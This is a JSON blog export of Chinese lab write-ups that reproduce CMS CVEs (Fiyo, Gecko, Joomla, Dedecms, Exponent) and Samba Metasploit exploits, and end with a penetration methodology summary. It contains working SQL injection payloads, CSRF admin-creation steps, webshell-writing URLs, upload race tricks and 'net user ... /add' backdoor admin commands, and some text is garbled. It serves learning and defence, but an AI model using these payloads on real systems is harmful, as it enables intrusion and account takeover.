1.13选择“手动配置代理”,HTTP代理输入“127.00.1”、端口“8080”,单击“确定”按钮。如图13所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/13.png) 1.14打开burpsuite【C:\\tools\\Burp1.7.1】,密码填写【123456】然后点击 Simpan,查看提交的数据包,可以看到level的等级也被提交了,前面看到Editon的level等级是3,猜测如果修改成1那么就是Super Administrator权限。如图14所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/14.png) 1.15把level后的参数修改成1,然后点击Forward按钮放过数据包。如图15所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/15.png) 1.16点击【Intercept is off】关闭burpsuit的拦截。如图16所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/16.png) 1.17退出当前账号。然后再重新用【xipu】账户登录,可以发现左边的权限变多了,所属组变成了Super Administrator。如图17所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/17.png)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之CSRF添加管理员","slug":"铁三训练营之CSRF添加管理员","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:34:14.685Z","comments":true,"path":"2018/05/09/铁三训练营之CSRF添加管理员/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/","excerpt":"CVE-2015-1422 Gecko-CMS CSRF添加管理员","text":"CVE-2015-1422 Gecko-CMS CSRF添加管理员 托老师的福，竟然有机会报了铁人三项的比赛，赛前有个训练营，刚上去看了看，有漏洞复现的环境给练手，很舒服，不用搭建环境就可以操作，激动的我赶紧练手，然后打算把姿势存下来，加深理解，以防以后忘记。 漏洞复现访问【http://192.168.1.1/admin/】。如图所示 输入账号【admin】和密码【admin888】进行登入。如图所示 点击【admin】，然后再点击【new user】，可以看到添加管理员页面并没有存在验证码，按如下信息进行填写。如图所示1)N ame这里填ZXCV2) Email这里填zxcv@ zxcv.com3) Username这里填ZXCV4) User-group这里选择Administrator5) User Active这里选择Yes6) Password这里填124567) Confirm Password再次填写密码123456 单击“打开菜单”-&gt;”选项”，设置浏览器代理。如图所示 单击“高级”-&gt;”网络”-&gt;”设置”，打开网络代理设置页面。如图所示 选择“手动配置代理”，HTTP代理输入“127.0.0.1” ，端口“8080”，单击“确定”按钮。如图所示 打开burpsuite在[C.:toos\\Burp1.7.1] 然后提交，可以看到输入的信息都以明文的方式发送。如图所示 右键点击[Send to Repeater] 把3放进repeater模块，看数据包发现并没有Referer验证从哪里提交的数据，也没有tocker验证，点击GO发现返回包是302重定向。如图所示 关闭burpsuite的代理拦截，点击Users发现zxcv已经添加成功了，并没有出错。如图所示 这时把用户删了，然后回到上方所示的burpsuite界面，再次单击Go，使用burpsuite发送同样的数据包，发现用户还是创建成功了。于是推测存在csrfi漏洞。如图所示 右键发送的包选择【Engagement tools】下的【Generate CSRF PoC】生成csrf表单。如图所示 点击后生成poc,但是其中的符号被转码了，需要手动修改。 新建一个1.html在【C:\\phpStudy\\wWW】下，用sublime打开，把代码复制进去，然后把编码修改回原来的符号。如图所示 把用户删掉后，访问【192 168 1.2/1.html】 发现有个提交的按钮。如图所示 点击按钮后发现跳转到Edit User页面，这和前面抓包返回的302重定向一样。如图所示 看下users,发现添加成功，说明这个页面的确存在csrf漏洞。如图所示 但是如何利用呢，不能总是受害者点了才能用，这里可以利用JavaScript实现自动提交表单，受害者只要访问了恶意网页，将自动提交表单，不用点击，可以自己测试下。如图所示 防御csrf攻击可以添加token,验证码，referer验证从哪里来。这样能有效的阻止csrf漏洞。 加深理解CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 –引用百度百科 自己对他的一点理解之前就有接触到这个CSRF漏洞的概念，但是一直做渗透测试的时候没遇到，不过偶然在一次渗透过程中在登录网站后台时候遇到xss攻击，看过百度百科，就初步的认为，和XSS漏洞差不多，XSS漏洞通过站内信任用户，上传恶意代码，管理员点击以后就触发漏洞，CSRF是可以进行跨站攻击的。XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：1：登录受信任网站A，并在本地生成Cookie。2：在不登出A的情况下，访问危险网站B。看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：2.1：你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站（黄网）。2.2：你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。2.3：上述中所谓的攻击网站，可能就是一个钓鱼网站或者黄色网站。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之Joomla 前台注入","slug":"铁三训练营之Joomla 前台注入","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:59.172Z","comments":true,"path":"2018/05/09/铁三训练营之Joomla 前台注入/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BJoomla%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/","excerpt":"CVE-2015-7297 Joomla 前台注入","text":"CVE-2015-7297 Joomla 前台注入 师兄座谈会上讲过的Joomla模板漏洞。利用网页报错的一个注入。 漏洞复现输入[http://192.168.1.3/ index.php? option=com_contenthistory &amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[ordering]list[select]=(select 1 from (select count(), concat((select user()), floor(rand (0)2))from information_schema. tables group by2)x)】,利用报错注入可以获取到当前的用户信息,可以看到构造的sql语句已经成功的执行了。如图所示![图1](/images/铁三训练营之Joomla 前台注入/1.png) Joomla中有一个查看历史编辑版本的组件,该功能本应该只有管理员才能访问,但是该功能访问并不需要相应的权限。通过访问【http://192.168.1.3/ index.php?option= com_contenthistory】,可以使得服务端加载历史版本处理组件。打开(C:\\phpstudy\\WWW\\components\\com_contenthistory】下的【contenthistory.php】中,可以看到并没有进行相关权限的监测。如图所示![图2](/images/铁三训练营之Joomla 前台注入/2.png) 在目标机中可以看到文件包含【C:\\phpstudy\\WWW\\administrator\\components\\com_contenthistory】下的【contenthistory.php】。如图所示![图3](/images/铁三训练营之Joomla 前台注入/3.png) 程序初始化基于contenthistory组件的控制类JControllerLegacy,然后直接调用控制类的 execute()方法,在execute()方法中,会调用其控制类中的display()。打开【c:\\phpstudy\\WWW\\libraries\\legacy\\controller】下的【legacy.php】,处理程序从传递的参数中获取view和layout的参数值进行初始化试图,并且调用$mode=$this-&gt;geoModel($viewName)加载对应数据模块,最终会调用$view-&gt;display()函数进行试图处理。如图所示![图4](/images/铁三训练营之Joomla 前台注入/4.png) Sql注入漏洞涉及的是历史查看操作,也就是view=history的时候程序处理会导致注入。在程序进行数据提取时,会进入【C:\\phpstudy\\WWW\\administrator\\components\\com_contenthistory\\models\\history.php】文件中的getListQuery()函数。如图所示![图4](/images/铁三训练营之Joomla 前台注入/4.png) 看其中的Sql语句构造, getState函数用于获取模型的属性和其对应的值,函数定义位于【C:\\phpstudy\\WWW\\libraries\\legacy\\model】下的【legacy.php】中。如图所示![图5](/images/铁三训练营之Joomla 前台注入/5.png) 打开【C:\\phpstudy\\WWW\\libraries\\legacy\\model\\list.php】,解析请求中传递的list[]参数,解析并过滤预设键的值,但是忽略了list[select],而传递list[select]参数值最终会被解析到处理sql语句构建中的list.select里,从而导致了注入。如图所示![图6](/images/铁三训练营之Joomla 前台注入/6.png)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之Dedecms远程写文件","slug":"铁三训练营之Dedecms远程写文件","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:34:07.030Z","comments":true,"path":"2018/05/09/铁三训练营之Dedecms远程写文件/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/","excerpt":"CVE-2015-4553 Dedecms远程写文件","text":"CVE-2015-4553 Dedecms远程写文件 一个看得半懂不懂的漏洞。存住，等以后学了php以后再加深了解。 漏洞复现在目标机上查看【C: /phpstudy /www/data/admin/config update. php】,已经由原来的内容变为空的内容。如图所示 在192.168.1.2打开 phpstudy在【c/ phpstudy/www】下建立【dedecms/ demonata. a. txt】,写入【】,也可以是一句话。如图所示 访问【http: //192.168.1. 3/install/index. php?step=11&amp;inslockfile=a&amp;s_lang=a&amp;install_demo_name=../data/tchg. php&amp;updatehost=http: //192.168.12/】,可以看到出现了存在,说明 phpinfo已经写进去了。如图所示 访问 【http://192.168.1.3/data/tchg.php】,可以看到 phpinfo页面说明真的写进去了。如图所示 漏洞产生的原因发生在安装页面【c:/ phpstudy/www/install/index. php】,如果接收到的参数【step=11】,然后包含【C: /phpstudy /www/data/admin/config_update. php】。查看【 config_update.php】里面定义了【updateHost】变量。前面已经把这个文件里的内容绐清空了。这里利用了php5.2的特性,全局变量get可以赋值这样就控制了上传的内容,达到了写shel的目的。如图所示 漏洞修复,升级php版本,或者删除安装文件,或者把php.ini文件中的【register_globals】设置为off 加深理解引用大佬博客。写的很清楚。http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html 自己对他的一点理解这是一个典型的cms模板的漏洞了，就以我现在的水平（我也才学了半年的信息安全），感觉这种漏洞应该是属于审计出来的，应该是靠src去挖掘，我现在的代码水平不是很好，而且我还是先从OWASP TOP10开始慢慢摸索的渗透，对于这种cms的漏洞不是很懂，因为感觉需要一定的代码水平才能去理解，所以先把源码存下来，后面学了代码再去做一遍注释吧。 123456789101112131415161718192021222324252627else if($step==11)&#123;require_once(‘../data/admin/config_update.php’);$rmurl = $updateHost.”dedecms/demodata.&#123;$s_lang&#125;.txt”;echo $rmurl;$sql_content = file_get_contents($rmurl);$fp = fopen($install_demo_name,’w’);if(fwrite($fp,$sql_content))echo ‘ &lt;font color=”green”&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)’;elseecho ‘ &lt;font color=”red”&gt;[×]&lt;/font&gt; 远程获取失败’;unset($sql_content);fclose($fp);exit();","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之SQL注入漏洞","slug":"铁三训练营之Fiyo CMS sql注入","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:34:01.645Z","comments":true,"path":"2018/05/09/铁三训练营之Fiyo CMS sql注入/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BFiyo%20CMS%20sql%E6%B3%A8%E5%85%A5/","excerpt":"CVE-2015-3934 Fiyo CMS sql注入","text":"CVE-2015-3934 Fiyo CMS sql注入 一口气做了两个漏洞复现。晚上去吃夜宵。 漏洞复现点击旁边的登录按钮。如图所示 点击 Login后跳到登录界面随便输入用户名和密码。如图所示 单击“打开菜单”-&gt;”选项”,设置浏览器代理。如图所示 单击“高级”-&gt;”网络设置”,打开网络代理设置页面。如图所示 选择“手动配置代理”,HTTP代理输入“127.0.0.1”、端口“8080″,单击“确定”按钮。如图所示 打开 burpsuite【 C: tools\\Burp1.7.1】,通过burpsuite抓包,可以看到发送了3个值,user;pass和login,其中user和pass是输入的, login是不变的,右键点击【 Send to Repeater】。如图所示 构造延时注入语句在user【%2B( select(o) from( select( sleep(5)y)%2B】,点击G0,可以看到服务器沉睡了5秒返回了数据,可以判定存在注入。如图所示 可以编写延时注入脚本进行注入出管理员后台密码,已放在【 C: \\tools\\CVE-2015-3934 Fiyo CMS sq注入】，进入到该目录下面,按住 shift键鼠标右击,选择在此处打开命令窗口。如图所示 在终端输入【 python zz.py】。可以跑出管理员的账户密码。如图所示 这个脚本运用了3个模块, requests, urllib2和 urlin模块,分为两个函数,一个是 request函数是用来判断返回有演出,运用了 python的异常处理机制, admin函数是用来进行数据枚举,输入完成后传入 request函数进行判断如图所示 在192.168.1.3的机器上打开【c: phpstudy\\apps \\app user】下的【 sys user. php】,在178行可以看到查询语句,先判断是否接收到ogin参数,如果接收到的话,用 strip tags过滤传过来的user参数, string tags函数找事剥去字符串中的html、xm以及php的标签,说明并没有过滤sq|语句,可以造成sq注入,然后执行 select这个函数。如图所示 加深理解这个类型的注入属于POST登录框注入。 GET - 从指定的资源请求数据。 POST - 向指定的资源提交要被处理的数据同样是未对SQL操作语句进行过滤产生的漏洞，只是这个是在登录框内提交SQL操作语句。 自己对他的一点理解其实，对于post注入，我一般都是用上工具sqlmap的，因为我现在还没学完python，所以往下我打算引用别人sqlmap的post注入方法。https://blog.csdn.net/u011781521/article/details/58594941他的文章写的很详细了。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之Metasploit溢出samba提权漏洞","slug":"铁三训练营之Metasploit溢出samba提权漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:56.382Z","comments":true,"path":"2018/05/09/铁三训练营之Metasploit溢出samba提权漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsamba%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/","excerpt":"Metasploit溢出samba提权漏洞","text":"Metasploit溢出samba提权漏洞 网络拓扑图 利用nmap工具扫描目标主机1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示 1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放445端口、139端囗并且安装samba软件,版本为3。如图2所示 1.3在终端中输入命令” msfconsole”,启动MSF终端如图3所示 1.4在终端中输入命令” search samba”,搜索 samba的相关工具和攻击载荷。如图4所示 1.5在终端中输入命令”use exploit/multi/samba/usermap_script”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示 1.6在终端中输入命令”info”,查看需要设置的相关项,”yes”表示必须填写的参数。如图6所示 1.7在终端中输入命令” set RHOST 192.168.1.3”,设置目标主机的P地址。如图7所示 1.8在终端中输入” exploit”,开始向目标主机攻击，攻击成功后，建立会话。如图8所示 1.9在终端中输入” whoami”,查看获得的权限为root，输入命令”ifconfig”，查看系统的网络信息。如图9所示","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"铁三训练营之Exponent cms任意文件上传漏洞","slug":"铁三训练营之Exponent cms任意文件上传漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:34:04.478Z","comments":true,"path":"2018/05/09/铁三训练营之Exponent cms任意文件上传漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BExponent%20cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"CVE-2016-7095 Exponent cms任意文件上传漏洞","text":"CVE-2016-7095 Exponent cms任意文件上传漏洞 漏洞复现在操作机桌面新建一个【exp.php】,里面写上【】。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/1.png) 在操作机浏览器上访问【192.168.1.2/1.html】,点击上传我们刚写的【exp.php】文件。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/2.png) 在操作机发送后快速访问【http: //192.168.1.3/index.php?module=eventregistration&amp;action=eventsCalendar】如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/3.png) 在操作机右键查看页面源代码,找到rel查看时间戮。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/4.png) 这是当前的时间戳,比上传木马文件的时间戳在数值上要大一点,下面爆破上传木马文件的时间戳,用 python编写脚本爆破前20位就可以了,爆破的文件名为【http://192.168.1.3/tmp/时间戳_exp.php】。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/5.png) 运行后获得路径,访问后发现 phpinfo的确写上去了如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/6.png)![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/7.png) 在目标机上先打开【C:\\phpstudy\\WWW\\framework\\modules\\commerce\\controllers】下的【eventregistrationController.php】,在第1166行看把上传的文件放在tmp目录下,命令是以时间戳下划线和文件名。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/8.png) 在目标机上可以看到有一个文件上传的操作,跟踪一下moveuploadeFilel函数,在【C:\\phpstudy\\WWW\\framework\\modules\\file\\models】下的【expFile.php】中的1508行中,这里没有对文件的后缀名进行检测,可以上传任意后缀名。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/9.png) 在【C:\\phpstudy\\WWW\\framework\\modules\\commerce\\controllers】下的【eventregistrationController.php】,再往下可以看到有一个删除临时文件的操作。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/10.png) 看起来是没有用的,传上去之后立马删掉了,文件存在的时间超短,并且文件命名的方式里带有时间戳,并不能很快的利用这个文件,但是在上传文件到删除之间有个调用函数的操作。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/11.png) 看一下quickBatchSend函数,在【C:\\phpStudy\\WWW\\framework\\core\\subsystems】下的【expmail.php】的378行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/12.png) 有看见调用了addTo函数,在该文件的647行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/13.png) 然后又调用了setTo函数在【C:\\phpStudy\\WWW\\external\\swiftmailer-5.4.2\\lib\\classes\\Swift\\Mime】下的【SimpleMessage.php】的第316行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/14.png) 这里调用了addMailboxHeader函数,在【C:\\phpStudy\\WWW\\external\\swiftmailer-5.4.2\\lib\\classes\\Swift\\Mime】下的【SimpleHeaderSet.php】的第65行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/15.png) 这里调用了createMailboxHeader,函数在【C:\\phpStudy\\WWW\\external\\swiftmailer-5.4.2\\lib\\classes\\Swift\\Mime】下的【SimpleHeaderFactory.php】的第54行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/16.png) 这里调用了setHeaderCharset函数,在【C:\\phpStudy\\external\\swiftmailer-5.4.2\\lib\\classes\\Swift\\Mime\\Headers】下的【MailboxHeader.php】的第61行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/17.png) 这里调用了setNameAddresses函数,在该文件的第104行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/18.png) 这里调用了normalizeMailboxes函数,在该文件的第250行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/19.png) 这里调用了_assertValidAddress函数,在该文件的第344行。可以看到这里对传入的 Address值做了一个正则匹配,如果正则不匹配的话,就会 throw出错误信息,导致运行的程序终止。这个步骤是在上传文件完成之后,删除文件开始之前,如果这个步骤出错就不会进行删除文件的操作,上传的文件就得以保留。只要传入一个错误的邮箱就会报错。但是还可以这么做。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/20.png) 看一下参数传入的地方在【C:\\phpstudy\\WWW\\framework\\modules\\commerce\\controllers】下的【eventregistrationController.php】的第1149行。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/21.png) 这里的$email_addy是可控的。用户正常的输入的话, $this-&gt; params[‘email_addresses’]应该是一个数组,然后后面的一切都能正规的运行下去,不会出错,但是如果不传入数组,传入一个字符串的话,结果就会返回一个null,意识就是Semail_addy=NULL。然后看到$email_addy带入到了quickBatchSend函数中去。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/22.png) 在quickBatchSend中又对$ email_addy做了处理,先判断是不是数组,不是的话,就变成一个数组。开始$ params[‘to’]为NULL,经过强行转换之后现在$ params[‘to’]为array(0=&gt;” “)。然后if判断为ture因为有一个空数组条件成立,也就不会赋值为默认邮箱如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/23.png) 然后将$ params[‘to’]值传递给了addTo,经过处里$email的值为aray(1)([O]=&gt; string(4)”.net”}把值传给setTo函数,然后一直传递下去。最后经过处理后$ address变成了字符串’ .net’。然后将这个字符串给了_assertvalidaddress做一个正则匹配是不是有效邮箱,很明显不是于是就抛出了错误。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/24.png) 如何知道time(),在【C:\\phpstudy\\WWW\\framework\\modules\\commerce\\controllers】下的【eventregistrationController.php】第129行,这里直接将time()打印到网页源码中能得到一个大概的值,然后爆破下文件名就可以 getshell了。如图所示![你想输入的替代文字](/images/铁三训练营之Exponent cms任意文件上传漏洞/25.png)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞","slug":"铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:52.742Z","comments":true,"path":"2018/05/09/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsysmlink%20%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","excerpt":"Metasploit溢出sysmlink 默认配置目录遍历漏洞","text":"Metasploit溢出sysmlink 默认配置目录遍历漏洞 网络拓扑图![图1](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/1.jpeg) 利用nmap工具扫描目标主机1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示![图2](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/2.jpeg) 1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放445端口、139端囗并且安装samba软件,版本为3。如图2所示![图3](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/3.jpeg) 1.3在终端中输入命令” msfconsole”,启动MSF终端如图3所示![图4](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/4.jpeg) 1.4在终端中输入命令” search samba”,搜索 samba的相关工具和攻击载荷。如图4所示![图5](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/5.jpeg) 1.5在终端中输入命令”use auxiliary/admin/smb/samba_symlink_traversal”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示![图6](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/6.jpeg) 1.6在终端中输入命令”info”,查看需要设置的相关项,”yes”表示必须填写的参数。如图6所示![图7](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/7.jpeg) 1.7在终端中输入命令” set RHOST 192.168.1.3”,设置目标主机的P地址。如图7所示![图8](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/8.jpeg) 1.8在终端中输入” set SMBSHARE tmp”,设置SAM可写文件。如图8所示![图9](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/9.jpeg) 1.9在终端中输入” exploit”,开始攻击。如图9所示![图10](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/10.jpeg) 1.10新打开一个终端,输入” smbclient //192.168.1.3/tmp”,直接回车,不用输入密码。如图10所示![图11](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/11.jpeg) 1.11在终端中输入” cd rootfs”,进入 rootfs目录在终端下输入命令”ls”,列出目录(命令无回显)。如图11所示![图12](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/12.jpeg) 1.12在终端中输入”more /etc/passwd”,查看目标主机系统中的密码。如图12所示![图13](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/13.jpeg)","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"铁三训练营之直播渗透思路小总结","slug":"铁三训练营之直播渗透思路小总结","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:38.332Z","comments":true,"path":"2018/05/09/铁三训练营之直播渗透思路小总结/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8B%E7%9B%B4%E6%92%AD%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E6%80%BB%E7%BB%93/","excerpt":"想法走在行为前面。","text":"想法走在行为前面。 看了铁三训练营的直播，老师讲的真不错，以前开始自学的时候，看视频，视频里教的都是技术，方法，学是学会了，但是总感觉不对劲，在实操的时候，还是觉得自己遇到很多困难。后来仔细思考了以后，才明白更多的是思路，当你思路对了，在实践的过程中才可以一层一层的突破。 一，信息采集（1）收集的目标域名：子域名、DNS、CDN， IP：whois、c端、真实 端口：开放的端口服务、服务版本 服务器信息：脚本，框架，中间件版本等。 邮箱：邮箱服务器地址、邮箱系统软件版本、相关漏洞 企业信息：员工信息（手机号码、邮箱、姓名），组织框架、企业法人、企业综合信息 web信息：cms版本，漏洞历史、http方法、 网站客服：QQ、邮箱、电话 网站敏感文件\\信息：备份文件、测试文件、旧项目文件 查看常见的目录，比如robots.txt，PHPinfo等等 有遗漏，以后想起来再补充，欢迎大家补充 （2）收集方法域名：站长之家、微步在线、爱站网、layer子域名挖掘机、wydomian IP/端口：nmap、msscan 邮箱：技术提供厂家、源代码分析、漏洞网站、指纹能识别扫描器 企业信息：网站目录、企业查、天眼查、NOSEC大数据安全协作平台，威胁情报平台 – NOSEC.ORG 华西安全网–wooyun漏洞报告平台|乌云WooYun镜像|乌云知识库 web信息：cms—已支持识别的的cms列表,cms识别,源码识别,在线工具–BugScaner,抓包分析http方法 网站客服：搜索网站页面 网站敏感文件：https://github.com/ ，钟馗之眼，御剑、 拿webshell这个方法很多，各种各样的漏洞都有，不做详细分析。这个看自身学到的方法和个人水平。可以看看一下别人的方法。http://www.jb51.net/hack/381344.html 提权拿下webshell以后当然是进而提升到服务器权限，这里看一下直播的时候老师给到我的新思路。 （1）nessus扫描主机查看是否有漏洞这里给出教程。https://blog.csdn.net/kevinhanser/article/details/77508780 （1）获取管理员账号密码我之前的博客有讲过一个方法，就是用mimikatz抓取密码，这个不再做阐述。 看了直播，他又给了一个新的方法，获取抓取管理员账号密码的哈希值解密获取账号密码http://www.jb51.net/hack/44172.html （1）自己创建一个管理员账号密码当你webshell权限足够的时候就可以自己创建一个管理员账号密码 12net user exehack exehack.net /addnet localgroup administrators exehack /add 感觉思路基本是这样，但是细节方面又会拓展出很多思路来，各种思路然后再去用各种方法，之前一直觉得不对劲的是前期的信息采集一直没注重，但是看了直播以后发现这是一个重点。 